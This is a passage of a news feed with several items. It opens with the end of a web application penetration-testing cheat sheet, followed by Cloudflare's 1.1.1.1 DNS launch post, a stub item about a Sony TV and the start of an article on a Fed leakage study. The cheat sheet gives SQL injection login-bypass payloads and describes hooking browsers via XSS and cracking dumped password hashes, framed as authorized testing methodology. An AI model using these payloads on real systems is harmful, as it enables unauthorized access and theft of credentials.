&lt;td&gt;Developer tools built into Firefox for examining, editing, and debugging client-side code&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;JPEXS (FFDec)&lt;/td&gt;
&lt;td&gt;Open source SWF decompiler and editor&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;If the application that you’re testing makes use of flash or other compiled client-side technologies (e.g. silverlight) it’s worth it to download them to your filesystem and use a tool like &lt;code class=&quot;highlighter-rouge&quot;&gt;JPEXS FFDec&lt;/code&gt; to decompile them and examine the source code. If you’re able to successfully reverse engineer the application you may uncover some flaws in the underlying code.&lt;/p&gt;
&lt;h2 id=&quot;testing-web-services&quot;&gt;Testing Web Services&lt;/h2&gt;
&lt;p&gt;Web services are technologies used for machine to machine communication, but they should be tested using the same methodology that you’ve been employing prior to this (mapping -&amp;gt; discovery -&amp;gt; exploitation), using &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp&lt;/code&gt; to intercept requests and analyze responses from the API endpoint/s.&lt;/p&gt;
&lt;h4 id=&quot;testing-rest-web-services&quot;&gt;Testing REST Web Services&lt;/h4&gt;
&lt;p&gt;Ideally the first thing you should do prior to testing a REST web service is read the documentation if it is available. Typically, this will be the case when conducting a white-box or grey-box penetration testing and is generally perfered since it will allow for a more comprehensive test.&lt;/p&gt;
&lt;p&gt;In a black-box test we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp&lt;/code&gt; to intercept the request/response pairs and look at any information returned in a &lt;code class=&quot;highlighter-rouge&quot;&gt;JSON&lt;/code&gt; format to try and gain and understanding of the API, but this is very tedious and not recommended if possible.&lt;/p&gt;
&lt;p&gt;Regardless, since REST uses the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; protocol vs something like SOAP services we can test the API endpoints for the same vulnerabilities that we have previously in the &lt;strong&gt;discovery&lt;/strong&gt; phase such as SQL injection, and XSS.&lt;/p&gt;
&lt;p&gt;Please refer to these articles for additional resources when testing REST APIs.&lt;/p&gt;
&lt;h4 id=&quot;testing-soap-web-services&quot;&gt;Testing SOAP Web Services&lt;/h4&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;WSDLER (BApp)&lt;/td&gt;
&lt;td&gt;Parses WSDL files to create sample requests for all available methods&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;Although these days I certainly see more REST than I do SOAP when testing application web services it is still there and still something you should keep an eye out for.&lt;/p&gt;
&lt;p&gt;Something very nice about SOAP-based web services is that they are self documenting via WSDL (web service definition language) files. You can use a tool such as &lt;code class=&quot;highlighter-rouge&quot;&gt;Wsdler (BApp)&lt;/code&gt; to parse these files and send sample requests via &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp Repeater&lt;/code&gt; to the endpoint.&lt;/p&gt;
&lt;p&gt;Same as REST, these services should be tested for the same vulnerabilities as the other areas of the application (e.g. sql injection, xss, etc.)&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Check out any service-related paths found during mapping/discovery
&lt;/li&gt;
&lt;li&gt;View the WSDL file for the service to load it into Burp&lt;/li&gt;
&lt;li&gt;Go to the Burp Proxy history tab and add the WSDL file to the Wsdler extension via the “Parse WSDL” context menu option.&lt;/li&gt;
&lt;li&gt;Send the sample request to Repeater and determine how the service works&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Please refer to these articles for additional resources when testing SOAP APIs.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.netspi.com/hacking-web-services-with-burp/&quot;&gt;https://blog.netspi.com/hacking-web-services-with-burp/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;In an engagement the goal of exploitation is to leverage the vulnerabilities found during discovery and measure how &lt;strong&gt;deep they go&lt;/strong&gt; and the &lt;strong&gt;true risk that they pose.&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In a nutshell what you want to do at this point is refer to the notes that you’ve taken during &lt;strong&gt;information gathering&lt;/strong&gt;, &lt;strong&gt;mapping&lt;/strong&gt;, and &lt;strong&gt;discovery&lt;/strong&gt; and dig as deep as possible into the vulnerabilities that you’ve discovered. Occasionally during the exploitation process you may traverse different (higher) levels of privilege within the target application. If this happens you want to go back and iterate over the methodology again starting at &lt;strong&gt;mapping&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;What follows are some example &lt;strong&gt;exploitation&lt;/strong&gt; scenarios, but this step is unique to every engagement.&lt;/p&gt;
&lt;div class=&quot;note important&quot; readability=&quot;7&quot;&gt;
&lt;h5&gt;Remember: you are taking your discovery findings to the next level!&lt;/h5&gt;
&lt;p&gt;which requires a lot of independent research that I cannot possibly fit into a single cheat sheet.&lt;/p&gt;
&lt;/div&gt;
&lt;h3 id=&quot;exploitation-scenarios&quot;&gt;Exploitation Scenarios&lt;/h3&gt;
&lt;h3 id=&quot;exploiting-cross-site-scripting&quot;&gt;Exploiting Cross-site Scripting&lt;/h3&gt;
&lt;h4 id=&quot;browser-hyjacking&quot;&gt;Browser Hyjacking&lt;/h4&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;BeEF&lt;/td&gt;
&lt;td&gt;A web-based interface for command and control of XSS-ed zombie browsers&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;If you’ve determined that the target application is indeed vulnerable to XSS during &lt;strong&gt;discovery&lt;/strong&gt; a good step to take during exploitation is to see if you can use a tool like &lt;code class=&quot;highlighter-rouge&quot;&gt;BeEF&lt;/code&gt; to “hook” zombie browsers via XSS.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://null-byte.wonderhowto.com/how-to/hack-like-pro-hack-web-browsers-with-beef-0159961/&quot;&gt;Here is a good article on doing just that&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Generally this is something you would use your own browser for in an isolated environment as a proof of concept for just how dangerous XSS is when you eventually present your findings to the client.&lt;/p&gt;
&lt;h3 id=&quot;exploiting-sql-injection&quot;&gt;Exploiting SQL injection&lt;/h3&gt;

&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1.5&quot;&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;SQLMap&lt;/td&gt;
&lt;td&gt;An automated SQL injection tool that both detects and exploits SQL injection flaws on many popular RDBMSs&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;If the target application is vulnerable to SQL injection &lt;code class=&quot;highlighter-rouge&quot;&gt;SQLMap&lt;/code&gt; will usually be the go-to tool in order to extract data during exploitation.&lt;/p&gt;
&lt;p&gt;There is a great tutorial on the &lt;a href=&quot;http://sqlmap.org/&quot;&gt;SQLMap site&lt;/a&gt; regarding the specific switches and how they work. that I recommend you refer to when first starting out with the tool.&lt;/p&gt;
&lt;h4 id=&quot;offline-password-cracking&quot;&gt;Offline Password Cracking&lt;/h4&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Hashcat&lt;/td&gt;
&lt;td&gt;World's fastest and most advanced password recovery utility&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;This one is a bit of a strech but something you should try if you get a dump of user account passwords from the target application.&lt;/p&gt;
&lt;p&gt;If the passwords are stored using a 1-way hashing algorithm you can likely use &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat&lt;/code&gt; along with a good wordlist such as &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; to crack them as detailed in &lt;a href=&quot;https://www.alpinesecurity.com/blog/2017/12/15/offline-password-cracking-the-attack-and-the-best-defense-against-it&quot;&gt;this article&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Needless to say something like this would be among the biggest findings you could bring to a client at the end of a penetration test.&lt;/p&gt;
&lt;h4 id=&quot;authentication-bypass&quot;&gt;Authentication Bypass&lt;/h4&gt;
&lt;p&gt;Something worth trying at this point (if you haven’t already) is to attempt to elevate your privilege within the application via SQL injection if you can. There are a good number of articles online about this, but here are a few sample payloads you can try entering on a vulnerable login form (leave password field blank of course)&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h3 id=&quot;cross-site-request-forgery-csrf&quot;&gt;Cross-site Request Forgery (CSRF)&lt;/h3&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Burp: Generate CSRF PoC&lt;/td&gt;
&lt;td&gt;Burp tool used to generate a CSRF proof of concept against the target application&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;If it comes to light that your target is vulnerable to CSRF (usually one of the first things &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp Scanner&lt;/code&gt; will pick up) you can use the Burp tool &lt;code class=&quot;highlighter-rouge&quot;&gt;Generate CSRF PoC&lt;/code&gt; to validate if the target application is indeed vulnerable.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-&quot;&gt;Here is a tutoral&lt;/a&gt; from portswigger on how to use the tool.&lt;/p&gt;
&lt;p&gt;However, it’s generally just a matter of:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Intercepting an HTTP request (ideally one where your testing account is changing some account information)&lt;/li&gt;
&lt;li&gt;Right-clicking that request in Burp&lt;/li&gt;
&lt;li&gt;Generating the CSRF PoC (and modifying some details of the request body)&lt;/li&gt;
&lt;li&gt;Saving the CSRF PoC to an &lt;code class=&quot;highlighter-rouge&quot;&gt;html&lt;/code&gt; file&lt;/li&gt;
&lt;li&gt;Opening the new &lt;code class=&quot;highlighter-rouge&quot;&gt;html&lt;/code&gt; file and clicking the &lt;code class=&quot;highlighter-rouge&quot;&gt;submit request&lt;/code&gt; button&lt;/li&gt;
&lt;li&gt;Validating that the attacker-intended change happened.&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;closing&quot;&gt;Closing&lt;/h2&gt;
&lt;p&gt;Thanks for reading! The goal of this sheet is to be a resource to anyone conducting a web application penetration test. The intent being to highlight &lt;strong&gt;methodology&lt;/strong&gt; over all else.&lt;/p&gt;
&lt;p&gt;With that in mind this is a living document and will be updated regularly over time as I receive feedback on it.&lt;/p&gt;
&lt;section class=&quot;share-buttons&quot;&gt;&lt;h2&gt;Enjoy the content? Share it!&lt;/h2&gt;
 

 

 

 

 
&lt;div class=&quot;resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--medium&quot;&gt;

Hacker News&lt;/div&gt;
&lt;/section&gt;</description>
<pubDate>Sun, 01 Apr 2018 13:42:48 +0000</pubDate>
<dc:creator>tachi</dc:creator>
<og:title>Web Application Penetration Testing Cheat Sheet</og:title>
<og:description>This cheatsheet is intended to run down the typical steps performed when conducting a web application penetration test. I will break these steps down into sub-tasks and describe the tools I recommend using at each level.</og:description>
<og:url>https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/</og:url>
<og:type>article</og:type>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/</dc:identifier>
</item>
<item>
<title>1.1.1.1: Fast, privacy-first consumer DNS service</title>
<link>https://blog.cloudflare.com/announcing-1111/</link>
<guid isPermaLink="true" >https://blog.cloudflare.com/announcing-1111/</guid>
<description>&lt;p&gt;Cloudflare's mission is to help build a better Internet. We're excited today to take another step toward that mission with the launch of &lt;a href=&quot;https://1.1.1.1/&quot;&gt;1.1.1.1&lt;/a&gt; — the Internet's fastest, privacy-first consumer DNS service. This post will talk a little about what that is and a lot about why we decided to do it. (If you're interested in the technical details on how we built the service, check out Ólafur Guðmundsson's &lt;a href=&quot;https://blog.cloudflare.com/dns-resolver-1-1-1-1&quot;&gt;accompanying post&lt;/a&gt;.)&lt;/p&gt;
&lt;h3 id=&quot;quickprimerondns&quot;&gt;Quick Primer On DNS&lt;/h3&gt;
&lt;p&gt;DNS is the directory of the Internet. Whenever you click on a link, send an email, open a mobile app, often one of the first things that has to happen is your device needs to look up the address of a domain. There are two sides of the DNS network: Authoritative (the content side) and Resolver (the consumer side).&lt;/p&gt;
&lt;p&gt;Every domain needs to have an Authoritative DNS provider. Cloudflare, since our launch in September 2010, has run an &lt;a href=&quot;https://www.dnsperf.com/&quot;&gt;extremely fast&lt;/a&gt; and &lt;a href=&quot;https://www.datanyze.com/market-share/dns/Alexa%20top%201M/Alexa%20top%201M&quot;&gt;widely-used&lt;/a&gt; Authoritative DNS service. &lt;a href=&quot;https://1.1.1.1/&quot;&gt;1.1.1.1&lt;/a&gt; doesn't (directly) change anything about Cloudflare's Authoritative DNS service.&lt;/p&gt;
&lt;p&gt;On the other side of the DNS system are resolvers. Every device that connects to the Internet needs a DNS resolver. By default, these resolvers are automatically set by whatever network you're connecting to. So, for most Internet users, when they connect to an ISP, or a coffee shop wifi hot spot, or a mobile network then the network operator will dictate what DNS resolver to use.&lt;/p&gt;
&lt;h3 id=&quot;dnssprivacyproblem&quot;&gt;DNS's Privacy Problem&lt;/h3&gt;
&lt;p&gt;The problem is that these DNS services are often slow and not privacy respecting. What many Internet users don't realize is that even if you're visiting a website that is encrypted — has the little green lock in your browser — that doesn't keep your DNS resolver from knowing the identity of all the sites you visit. That means, by default, your ISP, every wifi network you've connected to, and your mobile network provider have a list of every site you've visited while using them.&lt;/p&gt;
&lt;p&gt;Network operators have been licking their chops for some time over the idea of taking their users' browsing data and finding a way to monetize it. In the United States, that got easier a year ago when the Senate &lt;a href=&quot;https://arstechnica.com/information-technology/2017/03/how-isps-can-sell-your-web-history-and-how-to-stop-them/&quot;&gt;voted to eliminate rules&lt;/a&gt; that restricted ISPs from selling their users' browsing data. With all the concern over the data that companies like Facebook and Google are collecting on you, it worries us to now add ISPs like Comcast, Time Warner, and AT&amp;amp;T to the list. And, make no mistake, this isn't a US-only problem — ISPs around the world see the same privacy-invading opportunity.&lt;/p&gt;
&lt;h3 id=&quot;dnsscensorshipproblem&quot;&gt;DNS's Censorship Problem&lt;/h3&gt;
&lt;p&gt;But privacy concerns extend far beyond just ad targeting. Cloudflare operates &lt;a href=&quot;https://www.cloudflare.com/galileo/&quot;&gt;Project Galileo&lt;/a&gt; to protect at no cost politically or artistically important organizations around the world from cyber attack. Through the project we protect groups like LGBTQ organizations targeted in the Middle East, journalists covering political corruption in Africa, human rights workers in Asia, and bloggers on the ground covering the conflict in Crimea. We're really proud of the project and we're really good at stopping cyber attacks launched at its participants.&lt;/p&gt;
&lt;p&gt;But it's been depressing to us to watch all too frequently how DNS can be used as a tool of censorship against many of the groups we protect. While we're good at stopping cyber attacks, if a consumer's DNS gets blocked there's been nothing we could do to help.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.cloudflare.com/content/images/2018/04/Turkey_8.8.8.8.jpg&quot; alt=&quot;Turkey_8.8.8.8&quot;/&gt;&lt;/p&gt;
&lt;p&gt;In March 2014, for instance, the government of Turkey &lt;a href=&quot;https://www.theverge.com/2014/3/21/5532522/turkey-twitter-ban-google-dns-workaround&quot;&gt;blocked Twitter&lt;/a&gt; after recordings showing a government corruption scandal leaked online. The Internet was censored by the country's ISP's DNS resolvers blocking DNS requests for twitter.com. People literally spray painted 8.8.8.8, the IP of Google's DNS resolver service, on walls to help fellow Turks get back online. Google's DNS resolver is great, but diversity is good and we thought we could do even better.&lt;/p&gt;
&lt;h3 id=&quot;buildingaconsumerdnsservice&quot;&gt;Building a Consumer DNS Service&lt;/h3&gt;
&lt;p&gt;The insecurity of the DNS infrastructure struck the team at Cloudflare as a bug at the core of the Internet, so we set out to do something about it. Given we run one of the largest, most interconnected global networks — and have a lot of experience with DNS — we were well positioned to launch a consumer DNS service. We began testing and found that a resolver, running across our global network, &lt;a href=&quot;https://www.dnsperf.com/#!dns-resolvers&quot;&gt;outperformed&lt;/a&gt; any of the other consumer DNS services available (including Google's 8.8.8.8). That was encouraging.&lt;/p&gt;
&lt;p&gt;We began talking with browser manufacturers about what they would want from a DNS resolver. One word kept coming up: privacy. Beyond just a commitment not to use browsing data to help target ads, they wanted to make sure we would wipe all transaction logs within a week. That was an easy request. In fact, we knew we could go much further. We committed to never writing the querying IP addresses to disk and wiping all logs within 24 hours.&lt;/p&gt;
&lt;p&gt;Cloudflare's business has never been built around tracking users or selling advertising. We don't see personal data as an asset; we see it as a toxic asset. While we need some logging to prevent abuse and debug issues, we couldn't imagine any situation where we'd need that information longer than 24 hours. And we wanted to put our money where our mouth was, so we committed to retaining KPMG, the well-respected auditing firm, to audit our code and practices annually and publish a public report confirming we're doing what we said we would.&lt;/p&gt;
&lt;h3 id=&quot;enter1111&quot;&gt;Enter &lt;a href=&quot;https://1.1.1.1/&quot;&gt;1.1.1.1&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.cloudflare.com/content/images/2018/04/spraypainted-1.1.1.1.jpg&quot; alt=&quot;spraypainted-1.1.1.1&quot;/&gt;&lt;/p&gt;
&lt;p&gt;The one thing that was left was we needed a pair of memorable IPs. One of the core reasons for the DNS system is that IPs aren't very memorable. 172.217.10.46 isn't nearly as memorable as Google.com. But DNS resolvers inherently can't use a catchy domain because they are what have to be queried in order to figure out the IP address of a domain. It's a chicken and egg problem. And, if we wanted the service to be of help in times of crisis like the attempted Turkish coup, we needed something easy enough to remember and spraypaint on walls.&lt;/p&gt;
&lt;p&gt;We reached out to the team at APNIC. APNIC is a Regional Internet Registery (RIR) responsible for handing out IPs in the Asia Pacific region. It is one of five RIRs that manage IP allocation globally, the other four being: ARIN (North America), RIPE (Europe/Middle East), AFRINIC (Africa), and LATNIC (South America).&lt;/p&gt;
&lt;p&gt;APNIC's research group held the IP addresses &lt;a href=&quot;https://1.1.1.1/&quot;&gt;1.1.1.1&lt;/a&gt; and &lt;a href=&quot;https://1.0.0.1/&quot;&gt;1.0.0.1&lt;/a&gt;. While the addresses were valid, so many people had entered them into various random systems that they were continuously overwhelmed by a flood of garbage traffic. APNIC wanted to study this garbage traffic but any time they'd tried to announce the IPs, the flood would overwhelm any conventional network.&lt;/p&gt;
&lt;p&gt;We talked to the &lt;a href=&quot;https://labs.apnic.net/?p=1127&quot;&gt;APNIC&lt;/a&gt; team about how we wanted to create a privacy-first, extremely fast DNS system. They thought it was a laudable goal. We offered Cloudflare's network to receive and study the garbage traffic in exchange for being able to offer a DNS resolver on the memorable IPs. And, with that, &lt;a href=&quot;https://1.1.1.1/&quot;&gt;1.1.1.1&lt;/a&gt; was born.&lt;/p&gt;
&lt;h3 id=&quot;seriouslyapril1&quot;&gt;Seriously, April 1?&lt;/h3&gt;
&lt;p&gt;The only question that remained was when to launch the new service? This is the first consumer product Cloudflare has ever launched, so we wanted to reach a wider audience. At the same time, we're geeks at heart. &lt;a href=&quot;https://1.1.1.1/&quot;&gt;1.1.1.1&lt;/a&gt; has 4 1s. So it seemed clear that 4/1 (April 1st) was the date we needed to launch it.&lt;/p&gt;
&lt;img src=&quot;https://blog.cloudflare.com/content/images/2018/04/1.1.1.1-fancycolor-2.gif&quot; alt=&quot;1.1.1.1&quot;/&gt;&lt;p&gt;Never mind that it was a Sunday. Never mind that it was on Easter and during Passover. Never mind that it was April Fools Day — a day where tech companies often trot out fictional services they think are cute while the media and the rest of the non-tech world collectively roll their eyes.&lt;/p&gt;
&lt;p&gt;We justified it to ourselves that Gmail, another great, non-fictional consumer service, also launched on April 1, 2004. Of course, as Cloudflare's PR team has repeatedly pointed out to me in the run up to launch, the Gmail launch day was a Thursday and not on Easter. Nearly every media briefing I did this week ahead of the launch the reporter made me swear that this wasn't a joke. And it's not. I swear. And the best way to prove that is go to &lt;a href=&quot;https://1.1.1.1/&quot;&gt;1.1.1.1&lt;/a&gt;, follow the instructions to set it up, and see for yourself. It's real. And it's awesome.&lt;/p&gt;
&lt;h3 id=&quot;whydidwebuildit&quot;&gt;Why Did We Build It?&lt;/h3&gt;
&lt;p&gt;The answer to why we built the service goes back to our mission: to help build a better Internet. People come to work at Cloudflare every day in order to make the Internet better, more secure, more reliable, and more efficient. It sounds cheesy, but it's true.&lt;/p&gt;
&lt;p&gt;When, in 2014, we decided to enable encryption for free for all our customers a lot of people externally thought we were crazy. In addition to the technical and financial costs, SSL was, at the time, the primary difference between our free and paid service. And yet, it was a hard technical challenge, and clearly the right thing to do for the Internet, so we did it. And, in one day, &lt;a href=&quot;https://blog.cloudflare.com/introducing-universal-ssl/&quot;&gt;we doubled the size of the encrypted web&lt;/a&gt;. I'm proud of the fact that, three and a half years later, the rest of the industry is starting to follow suit. The web should have been encrypted from the beginning. It's a bug it wasn't. We're doing what we can do fix it.&lt;/p&gt;
&lt;p&gt;When, last year, we &lt;a href=&quot;https://blog.cloudflare.com/unmetered-mitigation/&quot;&gt;made DDoS mitigation free and unmetered across all our plans&lt;/a&gt; a lot of people again scratched their heads. But it was the right thing to do. You shouldn't have to have a big bank account to stand up to hackers and bullies online. Over time we're convinced that DDoS mitigation will be a commodity included with all platforms, so of course we should be leading the way to get to that inevitable that end.&lt;/p&gt;
&lt;p&gt;Part of the reason we've been able to hire such a great team is that we take on big challenges like this when they're the right thing to do. Walk around the office and our team's laptops are adorned with &lt;a href=&quot;https://1.1.1.1/&quot;&gt;1.1.1.1&lt;/a&gt; stickers because we're all proud of what we're doing. That alone made building this a no brainer. (PS - Sound fun? &lt;a href=&quot;https://www.cloudflare.com/careers/&quot;&gt;We're hiring&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.cloudflare.com/content/images/2018/04/1.1.1.1-laptop.jpg&quot; alt=&quot;1.1.1.1-laptop&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;towardabetterdnsinfrastructure&quot;&gt;Toward a Better DNS Infrastructure&lt;/h3&gt;
&lt;p&gt;But there's more. DNS itself is a 35-year-old protocol and it's showing its age. It was never designed with privacy or security in mind. In our conversations with browser, operating system, app, and router manufacturers nearly everyone lamented that, even with a privacy-first service like &lt;a href=&quot;https://1.1.1.1/&quot;&gt;1.1.1.1&lt;/a&gt;, DNS inherently is unencrypted so it leaks data to anyone who's monitoring your network connection. While that's harder to monitor for someone like your ISP than if they run the DNS resolver themselves, it's still not secure.&lt;/p&gt;
&lt;p&gt;What's needed is a move to a new, modern protocol. There are a couple of different approaches. One is DNS-over-TLS. That takes the existing DNS protocol and adds transport layer encryption. Another is DNS-over-HTTPS. It includes security but also all the modern enhancements like supporting other transport layers (e.g., QUIC) and new technologies like server HTTP/2 Server Push. Both DNS-over-TLS and DNS-over-HTTPS are open standards. And, at launch, we've ensured &lt;a href=&quot;https://1.1.1.1/&quot;&gt;1.1.1.1&lt;/a&gt; &lt;a href=&quot;https://developers.cloudflare.com/1.1.1.1/&quot;&gt;supports both&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We think DNS-over-HTTPS is particularly promising — fast, easier to parse, and encrypted. To date, Google was the only scale provider supporting DNS-over-HTTPS. For obvious reasons, however, non-Chrome browsers and non-Android operating systems have been reluctant to build a service that sends data to a competitor. We're hoping that with an independent DNS-over-HTTPS service now available, we'll see more experiments from browsers, operating systems, routers, and apps to support the protocol.&lt;/p&gt;
&lt;p&gt;We have no need to be the only such service. More diversity in DNS providers is a Good Thing™. If, over time, a robust ecosystem of networks offering DNS-over-HTTPS support develops then that'll go down as one of the things we'll be proud of in furthering our mission to help build a better Internet.&lt;/p&gt;
&lt;h3 id=&quot;tyingitalltogether&quot;&gt;Tying It All Together&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.cloudflare.com/content/images/2018/04/1.1.1.1-dns-resolver-performance.png&quot; alt=&quot;DNSPerf&quot;/&gt;&lt;/p&gt;
&lt;p&gt;While &lt;a href=&quot;https://www.dnsperf.com/#!dns-resolvers&quot;&gt;DNSPerf&lt;/a&gt; now ranks &lt;a href=&quot;https://1.1.1.1/&quot;&gt;1.1.1.1&lt;/a&gt; as the fastest DNS resolver when querying non-Cloudflare customers (averaging around 14ms globally), there's an added benefit if you're a Cloudflare customer using our Authoritative DNS. Because the resolver and the recursor are now on the same network, running on the same hardware, we can answer queries for Cloudflare's customers incredibly quickly. We can also support immediate updates, without having to wait for TTLs to expire.&lt;/p&gt;
&lt;p&gt;In other words, every new user of &lt;a href=&quot;https://1.1.1.1/&quot;&gt;1.1.1.1&lt;/a&gt; makes Cloudflare's Authoritative DNS service a bit better. And, vice versa, every new user of Cloudflare's Authoritative DNS service makes &lt;a href=&quot;https://1.1.1.1/&quot;&gt;1.1.1.1&lt;/a&gt; a bit better. So, if you're an existing Cloudflare customer, encourage your users to try &lt;a href=&quot;https://1.1.1.1/&quot;&gt;1.1.1.1&lt;/a&gt; and you'll see performance benefits from all those who do.&lt;/p&gt;
&lt;p&gt;Visit &lt;a href=&quot;https://1.1.1.1/&quot;&gt;https://1.1.1.1/&lt;/a&gt; from any device to get started with the Internet's fastest, privacy-first DNS service.&lt;/p&gt;
</description>
<pubDate>Sun, 01 Apr 2018 12:14:25 +0000</pubDate>
<dc:creator>satysin</dc:creator>
<og:type>article</og:type>
<og:title>Announcing 1.1.1.1: the fastest, privacy-first consumer DNS service</og:title>
<og:description>Cloudflare's mission is to help build a better Internet. We're excited today to take another step toward that mission with the launch of 1.1.1.1 — the Internet's fastest, privacy-first consumer DNS service. This post will talk a little about what that is and a lot about why we decided to do it.</og:description>
<og:url>https://blog.cloudflare.com/announcing-1111/</og:url>
<og:image>https://blog.cloudflare.com/content/images/2018/04/1.1.1.1-fancycolor.gif</og:image>
<dc:format>text/html</dc:format>
<dc:identifier>https://blog.cloudflare.com/announcing-1111/</dc:identifier>
</item>
<item>
<title>My Sony &quot;smart&quot; TV has updated itself and tried to force me to use a new app</title>
<link>https://twitter.com/buro9/status/980349887006076928</link>
<guid isPermaLink="true" >https://twitter.com/buro9/status/980349887006076928</guid>
<description>[unable to retrieve full-text content]&lt;p&gt;Article URL: &lt;a href=&quot;https://twitter.com/buro9/status/980349887006076928&quot;&gt;https://twitter.com/buro9/status/980349887006076928&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=16727319&quot;&gt;https://news.ycombinator.com/item?id=16727319&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Points: 476&lt;/p&gt;&lt;p&gt;# Comments: 369&lt;/p&gt;</description>
<pubDate>Sun, 01 Apr 2018 08:17:55 +0000</pubDate>
<dc:creator>DyslexicAtheist</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://mobile.twitter.com/buro9/status/980349887006076928</dc:identifier>
</item>
<item>
<title>Study finds increased possibility of information leaking around Fed meetings</title>
<link>https://news.uchicago.edu/article/2018/03/06/nyc-taxi-ride-data-suggest-cozy-relationship-between-big-banks-and-fed</link>
<guid isPermaLink="true" >https://news.uchicago.edu/article/2018/03/06/nyc-taxi-ride-data-suggest-cozy-relationship-between-big-banks-and-fed</guid>
<description>&lt;p&gt;Everyone in the financial markets would like to know what U.S. Federal Reserve policymakers are thinking. Will they raise interest rates? Where do they believe that the economy is going? What is their next move, and how will it affect my pocketbook?&lt;/p&gt;
&lt;p&gt;In a perfect world, everyone would get an answer to those questions at the same time. But new research from the University of Chicago Booth School of Business finds evidence that suggests Federal Reserve insiders systematically engaged in informal or discreet communication with the financial sector around the time of important policymaking meetings, increasing the probability of at least accidental leaks.&lt;/p&gt;
&lt;p&gt;In the working paper, “&lt;a href=&quot;https://research.chicagobooth.edu/-/media/research/stigler/pdfs/workingpapers/18whatinsightsdotaxiridesofferintofederalreserveleakage.pdf&quot;&gt;What Insights Do Taxi Rides Offer into Federal Reserve Leakage&lt;/a&gt;?” Chicago Booth PhD candidate David Andrew Finer analyzed more than 500 million New York City taxi rides and finds “highly statistically significant evidence of increases in opportunities for information flow” between the Federal Reserve Bank of New York and major commercial banks around Federal Open Market Committee meetings. &lt;/p&gt;
